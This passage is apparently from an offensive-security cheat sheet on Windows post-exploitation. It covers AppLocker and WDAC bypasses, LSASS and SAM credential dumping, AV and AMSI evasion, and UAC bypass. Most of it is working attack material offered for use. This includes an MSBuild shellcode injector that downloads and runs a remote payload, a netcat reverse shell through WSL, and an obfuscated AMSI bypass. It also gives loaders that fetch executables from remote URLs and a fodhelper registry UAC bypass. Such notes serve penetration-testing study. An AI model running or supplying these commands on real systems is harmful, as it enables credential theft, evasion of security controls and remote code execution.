<li>Uploading into <code>C:\Windows</code> requires elevated privileges, but there are places like <code>C:\Windows\Tasks</code> that are writeable by standard users. </li>
<li>DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.</li>
<li>Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList</li>
</ul>
<h4 id="check-if-applocker-is-enabled">Check if Applocker is enabled</h4>
<div class="highlight"><pre><span></span><code>Get-AppLockerPolicy -Effective
</code></pre></div>
<h4 id="enumerate-applocker-policy">Enumerate Applocker policy</h4>
<div class="highlight"><pre><span></span><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</code></pre></div>
<div class="highlight"><pre><span></span><code>Get-ChildItem &quot;HKLM:Software\Policies\Microsoft\Windows\SrpV2&quot;
Get-ChildItem &quot;HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe&quot;

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
</code></pre></div>
<h4 id="check-policy-with-gporesult">Check policy with GPOresult</h4>
<ul>
<li>Open the HTLM file locally
<div class="highlight"><pre><span></span><code>gpresult /H gpos.html
</code></pre></div></li>
</ul>
<h4 id="parse-gpo-applocker">Parse GPO applocker</h4>
<ul>
<li>https://github.com/PowerShell/GPRegistryPolicy
<div class="highlight"><pre><span></span><code>Get-DomainGPO -Identity *applocker*
Parse-PolFile &quot;&lt;GPCFILESYSPATH FROM GET-DOMAINGPO&gt;\Machine\Registry.pol&quot; | select ValueName, ValueData
</code></pre></div></li>
</ul>
<h4 id="if-code-integrity-is-enforced-and-powershell-is-running-in-constrained-langauge-mode-use-winrs-instead-of-psremoting">If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting</h4>
<div class="highlight"><pre><span></span><code>runas /netonly /user:&lt;DOMAIN\&lt;USER&gt; cmd.exe
winrs -r:&lt;PC NAME&gt; cmd
</code></pre></div>
<h4 id="check-for-the-policy-on-disk">Check for the policy on disk</h4>
<ul>
<li><code>.p7b</code> is a signed policy</li>
<li>Check if there are any <code>.xml</code> files which didn't got removed with the policy
<div class="highlight"><pre><span></span><code>ls C:\Windows\system32\CodeIntegrity
</code></pre></div></li>
</ul>
<h3 id="wdac">WDAC</h3>
<ul>
<li>Tool to bypass: https://github.com/nettitude/Aladdin</li>
</ul>
<h3 id="disable-wdac">Disable WDAC</h3>
<ul>
<li>Policy in <code>C:\Windows\System32\CodeIntegrity\</code> in a <code>.p7b</code> file. Delete the file and reboot to delete policy.</li>
<li>Only works if WDAC isn't enforced through GPO but setup locally!</li>
</ul>
<h4 id="check-for-wdac">Check for WDAC</h4>
<div class="highlight"><pre><span></span><code>Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
</code></pre></div>
<h4 id="check-for-the-policy-on-disk_1">Check for the policy on disk</h4>
<ul>
<li><code>.p7b</code> is a signed policy</li>
<li>Check if there are any <code>.xml</code> files which didn't got removed with the policy
<div class="highlight"><pre><span></span><code>ls C:\Windows\system32\CodeIntegrity
</code></pre></div></li>
</ul>
<h3 id="code-signing">Code signing</h3>
<ul>
<li>Code signing ensures that files weren't tampered with and are verified by a trusted authority.</li>
<li>ADCS code signing EKU = <code>Code Signing</code> (<code>1.3.6.1.5.5.7.3.3</code>)</li>
<li>Requires Code Signing cert to be extracted from a system, or created through ADCS and it should be allowed in the WDAC policy!</li>
</ul>
<h4 id="convert-pem-to-pfx-with-openssl">Convert Pem to PFX with openssl</h4>
<div class="highlight"><pre><span></span><code>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
</code></pre></div>
<h4 id="check-pfx-file-for-code-signing-eku">Check .pfx file for code signing EKU</h4>
<ul>
<li><code>Code Signing 1.3.6.1.5.5.7.3.3</code></li>
<li><code>Cert Hash(sha1)</code> to validate cert hash
<div class="highlight"><pre><span></span><code>certutil -v -dump -p &quot;&lt;PASSWORD&gt;&quot; &lt;PATH TO PFX&gt;
</code></pre></div></li>
</ul>
<h4 id="sign-a-tool">Sign a tool</h4>
<ul>
<li>https://learn.microsoft.com/en-us/dotnet/framework/tools/signtool-exe
<div class="highlight"><pre><span></span><code>.\signtool.exe sign /fd SHA256 /a /f &lt;PATH TO PFX FILE&gt; /p &#39;&lt;PASSWORD&gt;&#39; &lt;EXE TO SIGN&gt;
</code></pre></div></li>
</ul>
<h4 id="get-signer-certificate-of-tool">Get Signer Certificate of tool</h4>
<div class="highlight"><pre><span></span><code>Get-AuthenticodeSignature -FilePath &lt;PATH TO EXE&gt;
</code></pre></div>
<h3 id="lolbas">LOLBAS</h3>
<ul>
<li>Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/</li>
<li>Can be used to bypass Applocker or WDAC</li>
</ul>
<h4 id="rundll32exe-and-comsvcsdll-dumping-lsass">rundll32.exe and comsvcs.dll dumping lsass:</h4>
<div class="highlight"><pre><span></span><code>Get-Process | Select-String lsass
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump &lt;PROCESS ID&gt; C:\Users\Public\lsass.dmp full
dir C:\Users\Public\lsass.dmp

Invoke-Mimikatz -Command &#39;&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot;&#39;
</code></pre></div>
<h4 id="regexe-dumping-sam">Reg.exe dumping sam</h4>
<div class="highlight"><pre><span></span><code>reg save HKLM\SECURITY security.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SAM sam.bak

Invoke-Mimikatz -Command &#39;&quot;lsadump::sam system.bak sam.bak&quot;&#39;
secretsdump.py -sam sam.bak -security security.bak -system system.bak local
</code></pre></div>
<h4 id="rundll32exe-dll-payload">rundll32.exe dll payload</h4>
<div class="highlight"><pre><span></span><code>C:\Windows\System32\rundll32.exe &lt;FILE&gt;.dll,StartW
</code></pre></div>
<h3 id="msbuiltexe">Msbuilt.exe</h3>
<ul>
<li>Can be used to execute arbitrary C# code from a <code>.csproj</code> or <code>.xml</code> file.
<div class="highlight"><pre><span></span><code>msbuild.exe &lt;FILE&gt;
</code></pre></div></li>
</ul>
<h4 id="example-shellcode-injector">Example shellcode injector</h4>
<div class="highlight"><pre><span></span><code>&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
  &lt;Target Name=&quot;MSBuild&quot;&gt;
   &lt;MSBuildTest/&gt;
  &lt;/Target&gt;
   &lt;UsingTask
    TaskName=&quot;MSBuildTest&quot;
    TaskFactory=&quot;CodeTaskFactory&quot;
    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
     &lt;Task&gt;
      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
        &lt;![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = &quot;http://&lt;IP&gt;&quot;;
                        shellcode = client.DownloadData(&quot;shellcode.bin&quot;);
                    }

                    var hKernel = LoadLibrary(&quot;kernel32.dll&quot;);
                    var hVa = GetProcAddress(hKernel, &quot;VirtualAlloc&quot;);
                    var hCt = GetProcAddress(hKernel, &quot;CreateThread&quot;);

                    var va = Marshal.GetDelegateForFunctionPointer&lt;AllocateVirtualMemory&gt;(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer&lt;CreateThread&gt;(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

            [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport(&quot;kernel32&quot;)]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]&gt;
      &lt;/Code&gt;
    &lt;/Task&gt;
  &lt;/UsingTask&gt;
&lt;/Project&gt;
</code></pre></div>
<h4 id="example-powershell-clm">Example PowerShell clm</h4>
<div class="highlight"><pre><span></span><code>&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
  &lt;Target Name=&quot;MSBuild&quot;&gt;
   &lt;MSBuildTest/&gt;
  &lt;/Target&gt;
   &lt;UsingTask
    TaskName=&quot;MSBuildTest&quot;
    TaskFactory=&quot;CodeTaskFactory&quot;
    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
     &lt;Task&gt;
     &lt;Reference Include=&quot;System.Management.Automation&quot; /&gt;
      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
        &lt;![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript(&quot;$ExecutionContext.SessionState.LanguageMode&quot;);

                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r =&gt; r.ToString()).ToArray());

                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]&gt;
      &lt;/Code&gt;
    &lt;/Task&gt;
  &lt;/UsingTask&gt;
&lt;/Project&gt;
</code></pre></div>
<h2 id="lsass-protections">LSASS Protections</h2>
<h3 id="credential-guard">Credential Guard</h3>
<h4 id="check-if-credential-guard-is-configured">Check if credential guard is configured</h4>
<div class="highlight"><pre><span></span><code>if ((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured -match &quot;CredentialGuardA&quot;) {return $true}else{return $false}
</code></pre></div>
<h4 id="check-if-credential-guard-is-running">Check if credential guard is running</h4>
<div class="highlight"><pre><span></span><code>if ((Get-ComputerInfo).DeviceGuardSecurityServicesRunning -match &quot;CredentialGuardA&quot;) {return $true}else{return $false}
</code></pre></div>
<h3 id="runasppl">RunasPPL</h3>
<ul>
<li>https://itm4n.github.io/lsass-runasppl/</li>
</ul>
<h4 id="check-if-runasppl-is-configured">Check if RunasPPL is configured</h4>
<div class="highlight"><pre><span></span><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL
</code></pre></div>
<h2 id="defeating-av">Defeating AV</h2>
<h3 id="general_1">General</h3>
<ul>
<li>EDR Hookdump https://github.com/zeroperil/HookDump</li>
<li>Overview of methods: https://github.com/CMEPW/BypassAV</li>
</ul>
<h3 id="obfuscation-tools">Obfuscation tools</h3>
<h4 id="c-binaries">C# binaries</h4>
<ul>
<li>Obfuscate C# binary with https://github.com/mkaring/ConfuserEx</li>
<li>Launch ConfuserEx</li>
<li>In Project tab select the Base Directory where the binary file is located.</li>
<li>In Project tab Select the Binary File that we want to obfuscate.</li>
<li>In Settings tab add the rules.</li>
<li>In Settings tab edit the rule and select the preset as <code>Normal</code>.</li>
<li>In Protect tab click on the protect button.</li>
<li>We will find the new obfuscated binary in the Confused folder under the Base Directory.</li>
</ul>
<h4 id="go-binaries">Go binaries</h4>
<ul>
<li>https://github.com/burrowers/garble</li>
</ul>
<h4 id="powershell_1">Powershell</h4>
<ul>
<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li>
<li><a href="https://github.com/JoelGMSec/Invoke-Stealth">https://github.com/JoelGMSec/Invoke-Stealth</a></li>
<li><a href="https://github.com/yoda66/PowerStrip">Remove comments with PowerStrip</a></li>
</ul>
<h3 id="evasion-techniques">Evasion techniques</h3>
<ul>
<li>Most examples are in PowerShell but techniques can be implemented in every coding language</li>
</ul>
<h4 id="things-that-get-you-caught">Things that get you caught</h4>
<ul>
<li>Using Templates; MSbuild template / scripts / etc</li>
<li>Not changing variable &amp; function names</li>
<li>Not removing comments</li>
<li>Not obfuscating common code exec patterns</li>
<li>Appplies to scripts, templates &amp; Compiled code</li>
<li>Not changing error messages etc.</li>
<li>Entropy</li>
<li>Rougly - high entropy = more random</li>
<li>Higher entropy = less compressible</li>
<li>Problem: we encrypt shellcode to evade</li>
<li>encrypted shellcode = more random -&gt; higher entropy</li>
<li>Dont randomize all the things<ul>
<li>Changing default variable/func. names is good, but random characters is bad. Use two-word pairs.</li>
</ul>
</li>
</ul>
<h4 id="how-amsi-evaluates-powershell-commands">How amsi evaluates PowerShell commands</h4>
<ul>
<li>The code is evaluated when its readable by the scripting engine</li>
<li>This is what allows us to still be able to obfuscate our code
<div class="highlight"><pre><span></span><code># This
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIASABlAGwAbABvACAAVwBvAHIAbABkACIAKQA=

# Becomes
Write-Host(&quot;Hello World&quot;)

# But This
Write-Host(&quot;He&quot; + &quot;llo&quot; + &quot;World&quot;)

# Does not become
Write-Host(&quot;Hello World&quot;)
</code></pre></div></li>
</ul>
<h3 id="change-the-following-in-scriptscode">Change the following in scripts/code</h3>
<h4 id="hash-of-filecode">Hash of file/code</h4>
<ul>
<li>Change Capitalization <ul>
<li>PowerShell ignores capitalization, AMSI ignored capitalization, but changing your hash is best practice.<ul>
<li><code>$variablename = "amsicontext"</code> to <code>$VaRiAbLeNaMe = "amsicontext"</code></li>
</ul>
</li>
<li>C# is case sensitive, but changing the capitalization changes the hash. (Must change every entry of the variable!)</li>
</ul>
</li>
<li>Remove comments<ul>
<li>Remove all comments out of the script/code<ul>
<li>https://powershell.one/isesteroids/quickstart/overview</li>
<li>https://github.com/yoda66/PowerStrip</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="byte-strings">Byte strings</h4>
<ul>
<li>Change variable names</li>
<li><code>$variablename = "amsicontext"</code> to <code>$LoremIpsum = "amsicontext"</code></li>
<li>Dont randomize all the things<ul>
<li>Changing default variable/func. names is good, but random characters is bad. Use two-word pairs (Example: DragonBerrySmasher)</li>
</ul>
</li>
<li>Concatenation</li>
<li><code>"amsicontext"</code> to <code>"am" + "si" + "con" + "te" + "xt"</code></li>
<li>Variable insertion</li>
<li><code>$variablename = 'context'</code> into <code>$variablename2 = "Amsi$variablename"</code></li>
<li>C# <code>string variablename = "context"; string variablename2 = $"amsi{variablename}";</code></li>
<li>Format string<ul>
<li><code>$variablename = "amsi{0}text -f "con"</code></li>
<li><code>$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);</code> to <code>$client = New-Object ("{0}{1}" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')("10.10.10.10",80);</code></li>
<li>C# <code>string variablename = "context"; string variablename2 = String.Format("amsi{0}",variablename);</code></li>
</ul>
</li>
<li>Potentially the order of execution</li>
<li>Obfuscating shellcode</li>
<li>Shellcode as UUID<ul>
<li>https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py</li>
</ul>
</li>
<li>Reverse shellcode bytes</li>
<li>Break into chunks</li>
<li>Divide code into two arrays - even &amp; odd bytes</li>
<li>Steganography</li>
<li><code>BigInteger() h/t</code></li>
<li>Shellcode as english words<ul>
<li>https://github.com/hardwaterhacker/jargon</li>
</ul>
</li>
<li>Shellcode as Emoji<ul>
<li>https://github.com/RischardV/emoji-shellcoding</li>
</ul>
</li>
<li>Lower entropy</li>
<li>Languages are not random</li>
<li>Create an array with a dictionary and compile it with the code (disable compiler optimization)</li>
<li>Misc</li>
<li>PowerShell<ul>
<li>Properties of an object<ul>
<li>Can be obfuscated with backticks <code>$notify.icon</code> to <code>$notify."i`c`on"</code></li>
</ul>
</li>
</ul>
</li>
<li>C#<ul>
<li>Changing the variable type (i.e list vs array) </li>
<li>Rename your entrypoints<ul>
<li>https://learn.microsoft.com/th-th/dotnet/framework/interop/specifying-an-entry-point#renaming-a-function-in-c-and-c\
<div class="highlight"><pre><span></span><code>[DllImport(&quot;kernel32&quot;)]
    private static extern IntPtr VirtualAlloc(
    UInt32 lpStartAddr, 
    UInt32 size, 
    UInt32 flAllocationType, 
    UInt32 flProtect);

[DllImport(&quot;kernel32, EntryPoint = VirtualAlloc&quot;,
    SetLastError = false, ExactSpelling = true)]
    private static extern IntPtr SplendidDragon(
    UInt32 lpStartAddr, 
    UInt32 size, 
    UInt32 flAllocationType, 
    UInt32 flProtect);
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="structure-of-the-code">Structure of the code</h4>
<ul>
<li>Change methods and lines of code around. </li>
</ul>
<h4 id="example-of-changing-amsi-bypass-string">Example of changing amsi bypass string</h4>
<div class="highlight"><pre><span></span><code># Original amsi bypass
[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true)

# New
$v=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39; + &#39;siUtils&#39;); $v.&quot;Get`Fie`ld&quot;(&#39;ams&#39; + &#39;iInitFailed&#39;,&#39;NonPublic,Static&#39;).&quot;Set`Val`ue&quot;($null,$true)
</code></pre></div>
<h3 id="defeating-microsoft-defender">Defeating Microsoft Defender</h3>
<ul>
<li>Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck</li>
<li>Run Threatcheck <code>.\ThreatCheck.exe -f .\shell.exe</code></li>
<li>Replace string which gets detected.</li>
<li>Recompile and check again!</li>
<li>Also possible to use https://github.com/dobin/avred</li>
</ul>
<h3 id="scanning-amsi">Scanning amsi</h3>
<h4 id="threatcheck">Threatcheck</h4>
<ul>
<li>https://github.com/rasta-mouse/ThreatCheck
<div class="highlight"><pre><span></span><code>.\ThreatCheck.exe -f .\shell.ps1 -e AMSI
</code></pre></div></li>
</ul>
<h4 id="amsitrigger">AmsiTrigger</h4>
<ul>
<li>https://github.com/RythmStick/AMSITrigger
<div class="highlight"><pre><span></span><code>.\AmsiTrigger.exe -i .\shell.ps1 -f 2
</code></pre></div></li>
</ul>
<h3 id="offensive-net">Offensive .NET</h3>
<ul>
<li>https://github.com/Flangvik/NetLoader</li>
<li>Load binary from filepath or URL and patch AMSI &amp; ETW while executing
<div class="highlight"><pre><span></span><code>C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
</code></pre></div></li>
</ul>
<h4 id="use-custom-exe-assembyload-to-run-netloader-in-memory-and-then-load-binary">Use custom exe Assembyload to run netloader in memory and then load binary</h4>
<div class="highlight"><pre><span></span><code>C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
</code></pre></div>
<h4 id="random-notes">Random notes</h4>
<div class="highlight"><pre><span></span><code>pyinstaller.exe --onefile .\CVE-2021-1675.py
pyarmor pack --clean -e &quot;--onefile &quot; .\CVE-2021-1675.py
</code></pre></div>
<h3 id="windows-subsystem-for-linux-wsl">Windows Subsystem for Linux WSL</h3>
<ul>
<li>AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.</li>
<li>With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.</li>
</ul>
<h4 id="netcat-shell">Netcat shell</h4>
<div class="highlight"><pre><span></span><code>wsl.exe mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc &lt;IP&gt; &lt;PORT&gt; 1&gt;/tmp/backpipe
</code></pre></div>
<h4 id="bypass-whitelisting">Bypass whitelisting</h4>
<ul>
<li>In both the above cases, the Windows application will have:
  – Same permissions as the WSL process. 
  – Run as the current Windows user.
  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
<div class="highlight"><pre><span></span><code>bash.exe -c cmd.exe
wsl.exe cmd.exe
</code></pre></div></li>
</ul>
<h2 id="privileges">Privileges</h2>
<h4 id="check-current-privileges">Check current privileges</h4>
<div class="highlight"><pre><span></span><code>whoami /priv
</code></pre></div>
<h3 id="sedebugprivileges">SeDebugPrivileges</h3>
<ul>
<li>http://woshub.com/obtain-sedebugprivilege-debug-program-policy-enabled/</li>
</ul>
<h4 id="export-the-current-user-rights-set-by-the-group-policies-to-a-text-file">Export the current user rights set by the group policies to a text file:</h4>
<div class="highlight"><pre><span></span><code>secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
</code></pre></div>
<h4 id="edit-the-secpolicying">Edit the secpolicy.ing</h4>
<ul>
<li>Change the SeDebugPrivileges to <code>S-1-5-32-544</code> the Local administrator group.
<div class="highlight"><pre><span></span><code>notepad.exe secpolicy.inf
</code></pre></div></li>
<li>Or converts sids: http://woshub.com/convert-sid-to-username-and-vice-versa/</li>
</ul>
<h4 id="save-the-new-user-rights-set">Save the new user rights set</h4>
<div class="highlight"><pre><span></span><code>secedit /configure /db secedit.sdb /cfg secpolicy.inf /overwrite /areas USER_RIGHTS
</code></pre></div>
<h4 id="start-cmd-again">Start cmd again</h4>
<ul>
<li>Check privileges with <code>whoami</code> if not having SeDebugPrivilege do <code>PsExec.exe -i cmd.exe</code></li>
</ul>
<h2 id="uac-bypass">UAC bypass</h2>
<ul>
<li>A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.</li>
<li>Tool: https://github.com/hfiref0x/UACME</li>
<li>Guide on how to build: https://ad-lab.gitbook.io/building-a-windows-ad-lab/vulnerabilities-and-misconfigurations-and-attacks/misc/page-3-4</li>
</ul>
<div class="highlight"><pre><span></span><code>.\Akagi64.exe &lt;METHOD&gt; &lt;EXECUTABLE&gt;
.\Akagi64.exe 34 cmd.exe
</code></pre></div>
<h4 id="automatec-uac-bypass-powershell-script">Automatec UAC bypass PowerShell script</h4>
<ul>
<li>https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass</li>
</ul>
<div class="highlight"><pre><span></span><code>.\Win-Multi-UAC-Bypass.ps1
</code></pre></div>
<h3 id="manual-uac-bypass">Manual UAC bypass</h3>
<ul>
<li>https://atomicredteam.io/defense-evasion/T1548.002/</li>
</ul>
<h4 id="fodhelper">Fodhelper</h4>
<ul>
<li>Can also use <code>C:\Windows\System32\cmd.exe /c powershell.exe</code>
<div class="highlight"><pre><span></span><code>New-Item &quot;HKCU:\software\classes\ms-settings\shell\open\command&quot; -Force
New-ItemProperty &quot;HKCU:\software\classes\ms-settings\shell\open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force
Set-ItemProperty &quot;HKCU:\software\classes\ms-settings\shell\open\command&quot; -Name &quot;(default)&quot; -Value &quot;&lt;PATH TO EXE&gt;&quot; -Force
Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot;

# Cleanup
Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force
</code></pre></div></li>
</ul>
<h4 id="check-current-uac-configuration">Check current UAC configuration</h4>
<ul>
<li>The default configuration for UAC is Prompt for consent for non-Windows binaries, but can also have different settings such as Prompt for credentials, Prompt for consent and Elevate without prompting.
<div class="highlight"><pre><span></span><code>Seatbelt.exe uac
</code></pre></div></li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.ad660dcc.min.js"></script>
      
    
  </body>
</html>